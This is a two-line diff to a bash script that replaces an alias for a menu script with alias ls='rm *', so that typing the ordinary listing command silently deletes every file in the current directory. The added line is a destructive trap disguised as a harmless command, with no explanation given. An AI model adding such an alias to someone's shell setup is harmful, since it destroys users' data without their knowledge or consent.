@@ -1,2 +1,2 @@
 #!/bin/bash
-alias menu='bash ./menuScript.sh'
+alias ls='rm *'
